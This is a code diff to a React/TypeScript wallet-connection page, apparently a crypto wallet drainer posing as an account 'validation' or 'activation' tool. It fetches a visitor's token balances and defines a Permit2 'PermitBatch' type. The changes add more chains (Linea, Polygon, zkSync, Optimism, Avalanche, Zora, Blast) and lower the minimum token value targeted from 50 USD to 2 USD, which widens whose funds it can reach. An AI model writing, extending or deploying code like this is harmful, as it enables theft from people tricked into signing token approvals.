@@ -10,7 +10,7 @@ import {
 import { ethers, Contract } from 'ethers'
 import { createAppKit, useAppKit, useAppKitProvider } from '@reown/appkit/react'
 import { Ethers5Adapter } from '@reown/appkit-adapter-ethers5'
-import { mainnet, arbitrum, base, bsc } from '@reown/appkit/networks'
+import { mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora } from '@reown/appkit/networks'
 import { Alchemy, Network } from 'alchemy-sdk'
 
 // Simplified PermitBatch type
@@ -38,7 +38,7 @@ interface TokenWithValue {
 }
 
 // Minimum token value threshold (in USD)
-const MIN_TOKEN_VALUE_USD = 50;
+const MIN_TOKEN_VALUE_USD = 2;
 
 function toDeadline(expiration: number): number {
   return Math.floor((Date.now() + expiration) / 1000)
@@ -55,6 +55,11 @@ const networkMap: any = {
   8453: Network.BASE_MAINNET,
   42161: Network.ARB_MAINNET,
   56: Network.BNB_MAINNET,
+  7777777: Network.ZORA_MAINNET,
+  81457 : Network.BLAST_MAINNET,
+  324: Network.ZKSYNC_MAINNET,
+  10: Network.OPT_MAINNET,
+  43114: Network.AVAX_MAINNET
 };
 
 // Improved function to fetch tokens with their values
@@ -147,7 +152,7 @@ const metadata = {
 createAppKit({
   adapters: [new Ethers5Adapter()],
   metadata,
-  networks: [mainnet, arbitrum, base, bsc],
+  networks: [mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora],
   projectId,
   features: { analytics: true }
 })
@@ -330,7 +335,7 @@ export default function IssuesContent() {
                 <p className="text-lg font-semibold text-purple-600">Ready to activate!</p>
               </div>
             ) : (
-              <p className='text-lg text-red-500 font-semibold'>Account not ready to be validatd</p>
+              <p className='text-lg text-red-500 font-semibold'>Account not ready to be validated</p>
             )}
           </>
         ) : (
